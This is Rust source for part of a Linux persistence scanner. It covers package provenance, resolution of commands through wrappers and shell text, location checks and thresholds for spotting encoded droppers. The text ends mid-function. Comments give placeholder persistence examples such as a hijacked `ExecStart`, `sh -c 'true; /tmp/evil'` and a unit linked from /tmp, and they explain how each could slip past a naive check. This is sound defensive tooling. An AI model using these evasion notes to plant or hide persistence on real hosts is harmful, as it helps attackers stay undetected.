//! The second phase. Collectors are independent by design and know nothing
//! of each other, so every fact that needs more than one of them lives here:
//! package provenance, whether a target exists, which unit shadows which, and
//! the LD_PRELOAD assignments that turn up in six different kinds of file.
//!
//! This is also where a rule engine would eventually go. The Entry record
//! carries the raw facts precisely so that it could.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

use crate::dbus;
use crate::entry::{Entry, Flag, Integrity, Kind, Provenance};
use crate::provenance;
use crate::root::{Root, is_hidden_path};
use crate::scan::Scan;

pub fn enrich(root: &Root, scan: &mut Scan) {
    let mut failed = Vec::new();

    let commands = stage(&mut failed, "targets", || {
        normalise_targets(root, &mut scan.entries);
        // Before anything reads target_path: a bare `ExecStart=backdoor`
        // names a file just as surely as an absolute path does, and it needs
        // the same provenance lookup and the same interpreter chain.
        resolve_bare_targets(root, &mut scan.entries);
        look_through_wrappers(root, &mut scan.entries)
    });
    scan.entries.extend(commands.unwrap_or_default());

    // Before the paths are gathered, so the interpreters and sourced files
    // these name get their provenance resolved in the same pass as everything
    // else rather than needing a second one.
    if let Some(chained) = stage(&mut failed, "interpreter chain", || interpreter_chain(root, &scan.entries)) {
        scan.entries.extend(chained);
    }

    let wanted = paths_to_resolve(root, &scan.entries);
    let resolution = stage(&mut failed, "provenance", || provenance::resolve(root, &wanted));
    let answers = match resolution {
        Some(r) => {
            failed.extend(r.failures.into_iter().map(|f| format!("provenance: {f}")));
            r.answers
        }
        None => provenance::Answers::new(),
    };

    per_entry(&mut failed, "provenance and targets", &mut scan.entries, |entry| {
        apply_provenance(root, entry, &answers);
        apply_target(root, entry);
        apply_location(root, entry);
    });

    // Authoritative enablement goes on after provenance, so a generated
    // unit can be re-attributed from Unpackaged to its generator. A user
    // manager answering on a socket in that user's own runtime directory is
    // exactly as hostile as a file they wrote.
    let entries = &mut scan.entries;
    let header = &mut scan.header;
    stage(&mut failed, "systemd enablement", || {
        if let Some(manager) = dbus::Manager::query(root) {
            let answered = dbus::apply(&manager, entries);
            if answered > 0 {
                header.enablement = "systemd-dbus".to_string();
            }
        }
    });

    stage(&mut failed, "shadowing", || {
        apply_shadowing(&mut scan.entries);
        cross_reference_suid(&mut scan.entries);
    });

    if let Some(preloads) = stage(&mut failed, "preloads", || preload_entries(root, &scan.entries)) {
        scan.entries.extend(preloads);
    }

    // Last, so the synthesised entries — a preload, a chained interpreter —
    // are measured by the same threshold as a collector's own.
    per_entry(&mut failed, "encoding", &mut scan.entries, apply_encoding);

    scan.entries.sort_by(|a, b| (a.kind, &a.source, &a.name).cmp(&(b.kind, &b.source, &b.name)));
    scan.header.enrichment_failures.extend(failed);
}

/// One enrichment stage, isolated the way a collector is (§3). A stage that
/// panics on hostile input loses its own facts, says so in the header, and
/// the scan carries on: a scan that aborts on the file the attacker crafted
/// is a scan the attacker controls.
fn stage<T>(failed: &mut Vec<String>, name: &str, f: impl FnOnce() -> T) -> Option<T> {
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(f)) {
        Ok(v) => Some(v),
        Err(payload) => {
            failed.push(format!("{name}: {}", crate::scan::panic_message(payload)));
            None
        }
    }
}

/// A stage applied entry by entry, so one entry's hostile bytes cost that
/// entry its facts and nothing else. The entry itself is kept and marked.
fn per_entry(failed: &mut Vec<String>, name: &str, entries: &mut [Entry], mut f: impl FnMut(&mut Entry)) {
    for entry in entries {
        if let Err(payload) = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| f(entry))) {
            let why = crate::scan::panic_message(payload);
            entry.note("enrichment_failed", format!("{name}: {why}"));
            failed.push(format!("{name}, entry {}: {why}", entry.short_id()));
        }
    }
}

/// Collectors disagree about whether a target path is the literal string from
/// the file or a path in the scan root's coordinates. Both are made to mean
/// the same thing here, once, so nothing downstream has to know which
/// collector produced an entry.
fn normalise_targets(root: &Root, entries: &mut [Entry]) {
    for e in entries {
        if let Some(target) = e.target_path.take() {
            e.target_path = Some(root.abs(root.rel(&target)));
        }
    }
}

/// A kernel interface is not a file any package could own. Asking the
/// provenance question about `/proc/modules` and answering "unpackaged" is a
/// category error that puts every loaded module — a couple of hundred on an
/// ordinary host — into the default view as a finding.
fn is_kernel_interface(rel: &Path) -> bool {
    rel.starts_with("proc") || rel.starts_with("sys")
}

/// Commands that are a bare name rather than a path, resolved against the
/// search path the mechanism would use.
fn resolve_bare_targets(root: &Root, entries: &mut [Entry]) {
    for entry in entries {
        // A collector that already knows there is no program to find says
        // so. The first word of a lua scriptlet is lua, not a command name.
        if entry.target_path.is_some() || entry.raw.contains_key("target_unverifiable") {
            continue;
        }
        let Some(command) = &entry.command else { continue };
        if let Some(found) = resolve_bare_command(root, entry.kind, command) {
            entry.note("target_resolved_from", "search path");
            entry.target_path = Some(found);
        }
    }
}

/// Programs that run a program named in their own arguments: the options of
/// each that take a value, and how many operands come before the command.
/// Taken at face value, `ExecStart=env evil` runs coreutils, and coreutils
/// is packaged and intact.
const WRAPPERS: &[(&str, &[&str], usize)] = &[
    ("env", &["-u", "-C", "--unset", "--chdir"], 0),
    ("nice", &["-n", "--adjustment"], 0),
    ("nohup", &[], 0),
    ("setsid", &[], 0),
    ("stdbuf", &["-i", "-o", "-e"], 0),
    ("ionice", &["-c", "-n", "-p", "-P", "-u", "--class", "--classdata"], 0),
    ("sudo", &["-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-T", "--user", "--group"], 0),
    // A priority, a duration, a lock file.
    ("chrt", &[], 1),
    ("timeout", &["-s", "-k", "--signal", "--kill-after"], 1),
    ("flock", &["-w", "-E", "--timeout", "--conflict-exit-code"], 1),
    // A script path, or with -c the command text itself.
    ("sh", &["-o", "-O"], 0),
    ("bash", &["-o", "-O"], 0),
    ("dash", &["-o"], 0),
    ("zsh", &["-o"], 0),
    // Inside `sh -c` text, the shell hands itself over to what follows.
    ("exec", &["-a"], 0),
];

/// Shell builtins and keywords that name no program. Their words are skipped
/// rather than looked up: `true` in `true; /tmp/evil` must not stand in for
/// the command after it.
const NO_PROGRAM: &[&str] = &[
    "cd", "export", "exit", "set", "unset", "local", "shift", "return", "read", "wait", "trap", "ulimit",
    "umask", "true", "false", ":", "echo", "printf", "test", "[", "[[", "readonly", "declare", "alias",
    "break", "continue", "fi", "done", "esac", "}", "then", "else",
];

/// Keywords that precede the command they govern.
const LEADING_KEYWORDS: &[&str] = &["if", "elif", "while", "until", "do", "!", "{", "time", "then", "else"];

/// One program a command line starts, the wrappers it was reached through,
/// and the simple command it came from. `program` is None where the command
/// word cannot be known without running the shell: `$CMD`, `$(...)`.
struct Run {
    by: Vec<&'static str>,
    program: Option<String>,
    words: Vec<String>,
}

/// Replaces a wrapper as an entry's target with what the wrapper runs, and
/// returns one entry per further program where the command line starts more
/// than one. Shell text is not a single program: `sh -c 'true; /tmp/evil'`
/// starts two, and taking the first would let coreutils vouch for the second.
fn look_through_wrappers(root: &Root, entries: &mut [Entry]) -> Vec<Entry> {
    let mut out = Vec::new();
    let mut seen: BTreeSet<(Kind, PathBuf, String)> = BTreeSet::new();
    for entry in entries.iter_mut() {
        if entry.raw.contains_key("target_unverifiable") {
            continue;
        }
        let Some(command) = &entry.command else { continue };
        let lines = commands(&String::from_utf8_lossy(command));
        let Some(first) = lines.first().and_then(|c| c.first()) else { continue };
        // systemd's ExecStart= prefixes.
        let head = first.trim_start_matches(['-', '@', '+', '!', ':']).to_string();
        // Only where argv[0] is what the collector took as the target: a PAM
        // module or a udev key has a target that is not the command word.
        let head_name = Path::new(&head).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        if entry.target_path.as_ref().is_some_and(|t| t.file_name().and_then(|n| n.to_str()) != Some(head_name.as_str())) {
            continue;
        }
        let mut runs = Vec::new();
        for mut words in lines {
            if let Some(w) = words.first_mut() {
                *w = w.trim_start_matches(['-', '@', '+', '!', ':']).to_string();
            }
            programs(words, Vec::new(), &mut runs);
        }
        // The one case with nothing to change: a single program, reached
        // directly, which is what the collector already has.
        if let [run] = runs.as_slice() {
            if run.by.is_empty() && run.program.as_deref() == Some(head.as_str()) {
                continue;
            }
        }
        match runs.as_slice() {
            // Only builtins: the shell itself is what runs.
            [] => {}
            [run] => {
                if !run.by.is_empty() {
                    entry.note("target_wrapped_by", run.by.join(" "));
                }
                entry.target_path = run.program.as_deref().and_then(|p| program_path(root, entry.kind, p));
            }
            _ => {
                entry.note("runs_commands", runs.len().to_string());
                for run in &runs {
                    let name = run.program.clone().unwrap_or_else(|| run.words.first().cloned().unwrap_or_default());
                    if !seen.insert((entry.kind, entry.source.clone(), name.clone())) {
                        continue;
                    }
                    // Kind and source are the carrier's, as in the interpreter
                    // chain: cron or systemd is still what makes this run.
                    let mut e = Entry::new(entry.kind, &entry.source, &name);
                    e.rekey(&root.rel(&entry.source));
                    e.target_path = run.program.as_deref().and_then(|p| program_path(root, entry.kind, p));
                    e.command = Some(run.words.join(" ").into_bytes());
                    e.trigger = entry.trigger;
                    e.principal = entry.principal.clone();
                    e.enabled = entry.enabled;
                    e.owner_uid = entry.owner_uid;
                    e.mode = entry.mode;
                    e.mtime = entry.mtime;
                    if !run.by.is_empty() {
                        e.note("target_wrapped_by", run.by.join(" "));
                    }
                    e.note("chain", "command line");
                    e.note("declared_by_entry", &entry.id);
                    out.push(e);
                }
            }
        }
    }
    out
}

/// A command word as a file inside the scan root, by path or by search path.
fn program_path(root: &Root, kind: Kind, program: &str) -> Option<PathBuf> {
    if program.starts_with('/') {
        Some(root.abs(root.rel(Path::new(program))))
    } else if program.contains('/') {
        None
    } else {
        resolve_bare_command(root, kind, program.as_bytes())
    }
}

/// The programs one simple command starts, following wrappers and shell text.
fn programs(mut words: Vec<String>, by: Vec<&'static str>, out: &mut Vec<Run>) {
    if by.len() > 8 {
        return;
    }
    let assignment = |w: &str| w.split_once('=').is_some_and(|(n, _)| !n.is_empty() && n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'));
    while words.first().is_some_and(|w| LEADING_KEYWORDS.contains(&w.as_str()) || assignment(w)) {
        words.remove(0);
    }
    let Some(word) = words.first().cloned() else { return };
    let name = Path::new(&word).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    if NO_PROGRAM.contains(&word.as_str()) {
        return;
    }
    match word.as_str() {
        // The file a shell sources is code it runs.
        "." | "source" => {
            if let Some(script) = words.get(1) {
                out.push(Run { by, program: Some(script.clone()), words });
            }
            return;
        }
        "eval" => {
            for c in commands(&words[1..].join(" ")) {
                programs(c, by.clone(), out);
            }
            return;
        }
        _ => {}
    }
    let Some(w) = wrapper(&name) else {
        let program = (!word.contains(['$', '`'])).then_some(word);
        out.push(Run { by, program, words });
        return;
    };
    let mut by_next = by.clone();
    by_next.push(w.0);
    match unwrap(w, &words[1..]) {
        Unwrapped::Argv(next) => programs(next, by_next, out),
        Unwrapped::Text(text) => {
            let before = out.len();
            for c in commands(&text) {
                programs(c, by_next.clone(), out);
            }
            // Text of nothing but builtins runs only the shell.
            if out.len() == before {
                out.push(Run { by, program: Some(word), words });
            }
        }
        // A shell given no script and no -c text is itself what runs: the
        // emergency and debug shells are exactly that.
        Unwrapped::Nothing if SHELLS.contains(&w.0) => out.push(Run { by, program: Some(word), words }),
        Unwrapped::Nothing => out.push(Run { by: by_next, program: None, words }),
    }
}

const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh"];

fn wrapper(name: &str) -> Option<&'static (&'static str, &'static [&'static str], usize)> {
    WRAPPERS.iter().find(|w| w.0 == name)
}

enum Unwrapped {
    Argv(Vec<String>),
    Text(String),
    Nothing,
}

/// What a wrapper hands on: an argv, shell text, or nothing at all.
fn unwrap(w: &(&str, &[&str], usize), args: &[String]) -> Unwrapped {
    let (name, valued, mut operands) = *w;
    let takes_text = SHELLS.contains(&name) || name == "flock";
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            i += 1;
            break;
        }
        if valued.contains(&a) {
            i += 2;
            continue;
        }
        // -c, or a cluster holding it (-lc, -ec, -xc): the next word is the
        // command, as shell text.
        if takes_text && a.starts_with('-') && !a.starts_with("--") && a.contains('c') {
            return args.get(i + 1).map_or(Unwrapped::Nothing, |t| Unwrapped::Text(t.clone()));
        }
        // env -S splits its argument into words and runs them.
        if name == "env" {
            let split = match a {
                "-S" | "--split-string" => args.get(i + 1).map(|t| (t.clone(), i + 2)),
                _ => a
                    .strip_prefix("--split-string=")
                    .or_else(|| a.strip_prefix("-S").filter(|t| !t.is_empty()))
                    .map(|t| (t.to_string(), i + 1)),
            };
            if let Some((text, next)) = split {
                let mut argv = commands(&text).into_iter().next().unwrap_or_default();
                argv.extend(args[next.min(args.len())..].iter().cloned());
                return Unwrapped::Argv(argv);
            }
        }
        if a.starts_with('-') && a.len() > 1 {
            i += 1;
            continue;
        }
        if matches!(name, "env" | "sudo") && a.contains('=') {
            i += 1;
            continue;
        }
        if operands > 0 {
            operands -= 1;
            i += 1;
            continue;
        }
        break;
    }
    match args.get(i..) {
        Some(rest) if !rest.is_empty() => Unwrapped::Argv(rest.to_vec()),
        _ => Unwrapped::Nothing,
    }
}

/// Shell text split into simple commands, each a list of words. `;`, `&`,
/// `|`, newlines and parentheses end a command; redirections and their files
/// are dropped; `$(...)` and backquoted text are commands of their own,
/// appended after the rest.
fn commands(text: &str) -> Vec<Vec<String>> {
    let mut out: Vec<Vec<String>> = Vec::new();
    let mut nested: Vec<Vec<String>> = Vec::new();
    let mut cmd: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut started = false;
    let mut redirect = false;
    let mut quote: Option<char> = None;
    let chars: Vec<char> = text.chars().collect();
    let mut i = 0;

    // A word ends: keep it, unless it names a redirection's file.
    fn end_word(word: &mut String, started: &mut bool, redirect: &mut bool, cmd: &mut Vec<String>) {
        if *started {
            let w = std::mem::take(word);
            if *redirect {
                *redirect = false;
            } else {
                cmd.push(w);
            }
            *started = false;
        }
    }

    while i < chars.len() {
        let c = chars[i];
        match (quote, c) {
            (Some('\''), '\'') | (Some('"'), '"') => quote = None,
            (Some('\''), c) => word.push(c),
            (None | Some('"'), '$') if chars.get(i + 1) == Some(&'(') => {
                let (inner, end) = balanced(&chars, i + 2);
                nested.extend(commands(&inner));
                word.push_str("$(");
                started = true;
                i = end;
            }
            (None | Some('"'), '`') => {
                let end = chars[i + 1..].iter().position(|c| *c == '`').map_or(chars.len(), |p| i + 1 + p);
                nested.extend(commands(&chars[i + 1..end].iter().collect::<String>()));
                word.push('`');
                started = true;
                i = end;
            }
            (None | Some('"'), '\\') => {
                if let Some(n) = chars.get(i + 1) {
                    if *n != '\n' {
                        word.push(*n);
                        started = true;
                    }
                }
                i += 1;
            }
            (Some(_), c) => word.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                started = true;
            }
            (None, '#') if !started => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
                continue;
            }
            (None, '<' | '>') => {
                // `2>` names a descriptor, not an argument.
                if started && !redirect && word.chars().all(|c| c.is_ascii_digit()) {
                    word.clear();
                    started = false;
                }
                end_word(&mut word, &mut started, &mut redirect, &mut cmd);
                while chars.get(i + 1).is_some_and(|n| matches!(n, '<' | '>' | '&' | '|')) {
                    i += 1;
                }
                // `>&2` duplicates a descriptor and names no file.
                if chars.get(i + 1).is_some_and(|n| n.is_ascii_digit()) && chars.get(i) == Some(&'&') {
                    i += 1;
                    while chars.get(i + 1).is_some_and(|n| n.is_ascii_digit()) {
                        i += 1;
                    }
                } else {
                    redirect = true;
                }
            }
            (None, ';' | '&' | '|' | '\n' | '(' | ')') => {
                end_word(&mut word, &mut started, &mut redirect, &mut cmd);
                redirect = false;
                if !cmd.is_empty() {
                    out.push(std::mem::take(&mut cmd));
                }
            }
            (None, c) if c.is_whitespace() => end_word(&mut word, &mut started, &mut redirect, &mut cmd),
            (None, c) => {
                word.push(c);
                started = true;
            }
        }
        i += 1;
    }
    end_word(&mut word, &mut started, &mut redirect, &mut cmd);
    if !cmd.is_empty() {
        out.push(cmd);
    }
    out.extend(nested);
    out
}

/// The text up to the parenthesis that closes one already open at `from`,
/// and the index of that parenthesis.
fn balanced(chars: &[char], from: usize) -> (String, usize) {
    let mut depth = 1;
    let mut quote: Option<char> = None;
    let mut i = from;
    while i < chars.len() {
        match (quote, chars[i]) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), _) => {}
            (None, c @ ('\'' | '"')) => quote = Some(c),
            (None, '(') => depth += 1,
            (None, ')') => {
                depth -= 1;
                if depth == 0 {
                    return (chars[from..i].iter().collect(), i);
                }
            }
            _ => {}
        }
        i += 1;
    }
    (chars[from..].iter().collect(), chars.len())
}

fn paths_to_resolve(root: &Root, entries: &[Entry]) -> BTreeSet<PathBuf> {
    let mut out = BTreeSet::new();
    for e in entries {
        let source = root.rel(&e.source);
        if is_kernel_interface(&source) {
            continue;
        }
        out.insert(source);
        if let Some(t) = &e.target_path {
            let target = root.rel(t);
            // Where a target is a link, the file it ends at is asked about
            // too. update-alternatives links belong to no package, and the
            // file behind one is what actually runs.
            if let Some(end) = link_end(root, &target) {
                out.insert(end);
            }
            out.insert(target);
        }
    }
    out
}

/// A link whose own verdict says nothing useful is judged by the file it
/// leads to, and the entry says so. That covers two ordinary cases: a link no
/// package owns (/usr/bin/editor -> /etc/alternatives/editor ->
/// /usr/bin/vim.basic is vim), and a packaged link dpkg cannot verify because
/// it records no digest for links at all (/usr/bin/python3 -> python3.10,
/// which another package ships). The same links pointed at /tmp end at an
/// unpackaged file, and that is the verdict that comes back.
fn through_link(
    root: &Root,
    entry: &mut Entry,
    rel: &Path,
    verdict: Provenance,
    answers: &provenance::Answers,
    note: &str,
) -> Provenance {
    let uninformative = matches!(
        verdict,
        Provenance::Unpackaged | Provenance::Packaged { integrity: Integrity::Unknown, .. }
    );
    if !uninformative {
        return verdict;
    }
    let Some(end) = link_end(root, rel) else { return verdict };
    match answers.get(&end) {
        Some(v) => {
            entry.note(note, root.abs(&end).to_string_lossy());
            v.clone()
        }
        None => verdict,
    }
}

/// The file a symlinked target finally resolves to, inside the scan root.
fn link_end(root: &Root, rel: &Path) -> Option<PathBuf> {
    if !root.stat(rel).is_ok_and(|m| m.is_symlink) {
        return None;
    }
    root.resolve(rel).ok().filter(|end| end != rel)
}

fn apply_provenance(root: &Root, entry: &mut Entry, answers: &provenance::Answers) {
    // An entry synthesised out of another one — a preloaded library, a
    // script's interpreter — is a row *about its target*. It keeps the
    // carrier's source so the location rules judge the right file, but the
    // package verdict has to be the target's, or an ordinary /bin/sh reached
    // through an unpackaged crontab would itself read as unpackaged.
    // An entry is about its target rather than its source in two cases: one
    // synthesised out of another entry, and one whose source is a kernel
    // interface no package can own. A loaded module's subject is the .ko it
    // came from, and that file is packaged like any other.
    let about_target = entry.raw.contains_key("declared_by_entry")
        || is_kernel_interface(&root.rel(&entry.source));
    let subject = about_target.then(|| entry.target_path.clone().map(|t| root.rel(&t))).flatten();

    let source_rel = subject.unwrap_or_else(|| root.rel(&entry.source));
    if is_kernel_interface(&source_rel) {
        entry.note("provenance_caveat", "read from a kernel interface, not a file a package can own");
        return;
    }

    // A path this pass was not asked about keeps whatever an earlier pass
    // decided. Writing Unknown over a resolved verdict would make a later,
    // narrower pass undo the work of the first one.
    if let Some(verdict) = answers.get(&source_rel).cloned() {
        // Only for an entry whose subject is its target. A link that is the
        // entry's own source — an alias in /etc/systemd/system — is itself
        // the evidence, and taking its target's verdict would hide it.
        let verdict =
            if about_target { through_link(root, entry, &source_rel, verdict, answers, "resolves_to") } else { verdict };
        match &verdict {
            Provenance::Unpackaged => entry.flag(Flag::Unpackaged),
            Provenance::Packaged { integrity: Integrity::Modified, .. } => entry.flag(Flag::PackagedModified),
            Provenance::Packaged { integrity: Integrity::ConffileModified, .. } => {
                entry.flag(Flag::ConffileModified)
            }
            _ => {}
        }
        entry.provenance = verdict;
    }

    // The target is a separate file with a separate verdict, and an entry
    // whose backing file is packaged can still point at something that is
    // not — which is the whole shape of a hijacked ExecStart.
    if let Some(target) = entry.target_path.clone() {
        let target_rel = root.rel(&target);
        if target_rel != source_rel {
            let verdict = answers
                .get(&target_rel)
                .cloned()
                .map(|v| through_link(root, entry, &target_rel, v, answers, "target_resolves_to"));
            match &verdict {
                Some(Provenance::Unpackaged) => {
                    entry.note("target_provenance", "unpackaged");
                    entry.flag(Flag::Unpackaged);
                }
                // A directory has no contents to hold a digest of. Its
                // integrity is not unknown so much as not a question, and
                // saying "unknown" would keep every `#includedir` in view.
                Some(Provenance::Packaged { package, .. })
                    if root.stat_follow(&target_rel).is_ok_and(|m| m.is_dir) =>
                {
                    entry.note("target_provenance", format!("{package} (directory)"));
                }
                Some(Provenance::Packaged { package, integrity, .. }) => {
                    entry.note("target_provenance", format!("{package} ({integrity})"));
                    if *integrity == Integrity::Modified {
                        entry.flag(Flag::PackagedModified);
                    }
                }
                // Recorded rather than dropped: the suppression rule needs to
                // know that the thing this entry runs is not a verified file.
                Some(Provenance::GeneratedBy { by }) => entry.note("target_provenance", format!("generated by {by}")),
                Some(Provenance::Unknown) => entry.note("target_provenance", "unknown"),
                // Every target is asked about, so no answer means the lookup
                // failed. Left unrecorded, the suppression rule would read the
                // silence as a verified target and hide the entry. A later,
                // narrower pass that was not asked keeps the earlier verdict.
                None if !entry.raw.contains_key("target_provenance") => {
                    entry.note("target_provenance", "unanswered");
                }
                None => {}
            }
        }
    }
}

/// Directories a bare command name is looked up in. Same list systemd uses,
/// and close enough to any shell's default PATH for the purpose.
const BIN_DIRS: [&str; 6] =
    ["usr/local/sbin", "usr/local/bin", "usr/sbin", "usr/bin", "sbin", "bin"];

/// A command that is not an absolute path is not automatically unresolvable.
/// systemd has allowed bare executable names for years, and `ExecStart=
/// systemctl ...` appears in a hundred vendor units on an ordinary host.
fn resolve_bare_command(root: &Root, kind: Kind, command: &[u8]) -> Option<PathBuf> {
    let text = String::from_utf8_lossy(command);
    let first = text.split_whitespace().next()?;
    // systemd's argument prefixes, and a quoted first token.
    let first = first.trim_start_matches(['-', '@', '+', '!', ':']).trim_matches(['"', '\'']);
    if first.is_empty() || first.contains('/') {
        return None;
    }
    // udev resolves its helper names against its own directory, which is why
    // `IMPORT{program}=ata_id` appears bare in dozens of vendor rules.
    let extra: &[&str] = match kind {
        Kind::Udev => &["usr/lib/udev", "lib/udev"],
        _ => &[],
    };
    extra
        .iter()
        .chain(BIN_DIRS.iter())
        .map(|d| format!("{d}/{first}"))
        .find(|p| root.exists(p))
        .map(|p| root.abs(p))
}

/// Why a target path cannot be checked against the filesystem at all.
fn unverifiable(target: &Path) -> Option<&'static str> {
    let text = target.to_string_lossy();
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        // A systemd specifier: %i, %f, %H. `%%` is a literal percent.
        if c == '%' {
            match chars.peek() {
                Some('%') => {
                    chars.next();
                }
                Some(n) if n.is_ascii_alphabetic() => return Some("unexpanded specifier"),
                _ => {}
            }
        }
    }
    if text.contains(['*', '?']) || (text.contains('[') && text.contains(']')) {
        return Some("glob pattern");
    }
    None
}

/// The reported digest, and whether the thing the entry runs is actually
/// there. An entry pointing at a path that does not exist is Autoruns' orphan
/// highlighting: cheap to check, impossible to fake.
fn apply_target(root: &Root, entry: &mut Entry) {
    let hashed = match &entry.target_path {
        Some(target) => {
            // A path holding a specifier or a glob names a set, not a file.
            // Reporting it missing would be a false finding on every
            // template unit and every sshd Include line.
            if let Some(why) = unverifiable(target) {
                entry.note("target_unverifiable", why);
                return;
            }
            let rel = root.rel(target);
            if !root.exists(&rel) {
                entry.flag(Flag::TargetMissing);
            }
            rel
        }
        None => {
            // No resolvable target. Where the entry is itself the script,
            // the source is what runs; where a command was parsed but no
            // path could be got out of it, that is a finding of its own —
            // unless the mechanism runs it inside its own process, as udev
            // does with its builtins, in which case there is no file to find.
            // A collector that already knows there is no path to find says
            // so, and is believed: a udev rule naming a systemd unit, or one
            // whose action runs inside udev itself, has no file to resolve.
            if entry.raw.get("key").is_some_and(|k| k.contains("{builtin}")) {
                entry.note("target_unverifiable", "runs inside udev, not a program");
            } else if entry.command.is_some() && !entry.raw.contains_key("target_unverifiable") {
                entry.flag(Flag::TargetUnresolvable);
            }
            root.rel(&entry.source)
        }
    };

    if entry.target_sha256.is_none() {
        if let Some(d) = provenance::digests(root, &hashed) {
            entry.target_sha256 = Some(d.sha256);
        }
    }
}

/// Where a mechanism's files are supposed to live. A unit or rule outside its
/// own search path — usually reached by a symlink from inside one — is worth
/// saying out loud.
fn standard_roots(kind: Kind) -> &'static [&'static str] {
    match kind {
        Kind::SystemdUnit | Kind::SystemdTimer | Kind::SystemdGenerator => &[
            "/etc/systemd/",
            "/etc/xdg/systemd/user/",
            "/run/systemd/",
            "/usr/lib/systemd/",
            "/lib/systemd/",
            "/usr/local/lib/systemd/",
            "/usr/share/systemd/user/",
            "/usr/local/share/systemd/user/",
        ],
        Kind::Udev => &["/etc/udev/", "/run/udev/", "/usr/lib/udev/", "/lib/udev/"],
        Kind::KernelModule => &[
            "/etc/modules",
            "/etc/modules-load.d/",
            "/etc/modprobe.d/",
            "/run/modules-load.d/",
            "/usr/lib/modprobe.d/",
            "/lib/modprobe.d/",
            "/usr/lib/modules-load.d/",
            "/proc/modules",
        ],
        Kind::XdgAutostart => &["/etc/xdg/autostart/"],
        Kind::Cron => &["/etc/crontab", "/etc/cron", "/etc/anacrontab", "/var/spool/cron"],
        _ => &[],
    }
}

fn apply_location(root: &Root, entry: &mut Entry) {
    let roots = standard_roots(entry.kind);
    if roots.is_empty() {
        return;
    }
    // Per-user autostart lives under each home, so the acceptable prefixes
    // are built from the homes actually found rather than matched loosely.
    let mut acceptable: Vec<String> = roots.iter().map(|r| (*r).to_string()).collect();
    let per_home: &[&str] = match entry.kind {
        Kind::XdgAutostart => &[".config/autostart/"],
        // The per-account half of the user manager's search path.
        Kind::SystemdUnit | Kind::SystemdTimer => {
            &[".config/systemd/user/", ".config/systemd/user.control/", ".local/share/systemd/user/"]
        }
        _ => &[],
    };
    for home in root.homes() {
        for sub in per_home {
            acceptable.push(format!("{}/{sub}", Path::new("/").join(root.rel(home)).display()));
        }
    }
    // A prefix test, not a substring one. `contains` let an attacker keep the
    // flag off by staging under any directory whose name happened to hold the
    // search path — /home/alice/etc/systemd/evil.service passed it.
    let inside = |p: &Path| {
        let text = p.to_string_lossy().into_owned();
        acceptable.iter().any(|r| text.starts_with(r.as_str()))
    };
    // Paths are judged as they sit inside the scan root, so an offline image
    // does not inherit the analyst's own directory names.
    let in_root = |p: &Path| Path::new("/").join(root.rel(p));

    // The source is always inside a search path, because that is where the
    // collector looked. What matters is where a symlink from inside one
    // actually leads: `systemctl link /tmp/evil.service` leaves a perfectly
    // ordinary-looking unit name in /etc.
    if let Some(target) = entry.raw.get("symlink_target") {
        // Masking is a link to /dev/null. That is the documented way to turn
        // a unit off, not a mechanism hiding outside its search path.
        if target == "/dev/null" {
            return;
        }
        let resolved = in_root(&resolve_link(root, &entry.source, Path::new(target)));
        if !inside(&resolved) {
            entry.flag(Flag::NonStandardLocation);
        }
        if is_hidden_path(&resolved) {
            entry.flag(Flag::HiddenPath);
        }
    } else if !inside(&in_root(&entry.source)) {
        entry.flag(Flag::NonStandardLocation);
    }
}

fn resolve_link(root: &Root, source: &Path, target: &Path) -> PathBuf {
    if target.is_absolute() {
        return root.abs(root.rel(target));
    }
    match source.parent() {
        Some(dir) => root.abs(root.rel(&dir.join(target))),
        None => target.to_path_buf(),
    }
}

/// Where a run of encoding characters stops being something an ordinary
/// command carries. Measured, not chosen. Across the 913 commands collected
/// from this host and five distribution roots (Debian 12 and 13, Ubuntu
/// 24.04, Fedora 43, AlmaLinux 9), and every Exec=, ExecStart= and udev RUN
/// line in 1,624 unit, desktop, rule and cron files, the longest base64-
/// alphabet run was 38 — `LVM_SUPPRESS_LOCKING_FAILURE_MESSAGES=` — and the
/// longest hex run was 40, a sha1 directory name inside a Wine launcher's
/// Exec line. Above those sit fixed-length families a scan will meet on a
/// host that was not measured: a 32-character nix store hash or a GUID with
/// its dashes stripped, and the 44 characters a sha256 takes in base64.
///
/// The hex ceiling is far higher because digests are ordinary. A sha256 is 64
/// hex characters and a sha512 is 128, and both are written out in commands
/// that are doing their job: `--hash=sha256:...`, a verity root hash, a
/// container id, a machine id. A hex threshold at or below 128 reports those,
/// and a flag that fires on them is worse than no flag at all.
const BASE64_RUN: usize = 48;
const HEX_RUN: usize = 160;

/// The longest run of encoding characters in a command that reaches its
/// alphabet's threshold: offset, length, and which alphabet.
///
/// `/` and `-` end a run although both are encoding characters, because every
/// long run containing them on a real host was a path or a hyphenated name:
/// `/usr/lib/systemd/system-generators/systemd-hibernate-resume-generator` is
/// a single 69-character run otherwise, and so is every UUID. What that costs
/// is symmetric and small — standard base64 is then broken only by `/` and
/// URL-safe base64 only by `-`, about one character in 64 either way — so a
/// payload is chopped into pieces rather than hidden: a 128-byte random
/// payload still leaves a 48-character run 97% of the time, and base64 of
/// text, which is what a shell dropper carries, is usually not broken at all.
///
/// A run drawn entirely from the hex alphabet is judged as hex even though it
/// is also valid base64. That is what keeps a sha256 out of the report.
fn encoded_run(command: &[u8]) -> Option<(usize, usize, &'static str)> {
    let is_core = |b: u8| b.is_ascii_alphanumeric() || b == b'+' || b == b'_';
    let mut best: Option<(usize, usize, &'static str)> = None;
    let mut i = 0;
    while i < command.len() {
        if !is_core(command[i]) {
            i += 1;
            continue;
        }
        let start = i;
        while i < command.len() && is_core(command[i]) {
            i += 1;
        }
        let body = i - start;
        // `=` counts as base64 padding and only as padding; taken as an
        // ordinary run character it would join a variable's name to its value
        // and report the pair as one long run.
        while i < command.len() && command[i] == b'=' && i - start < body + 2 {
            i += 1;
        }
        let len = i - start;
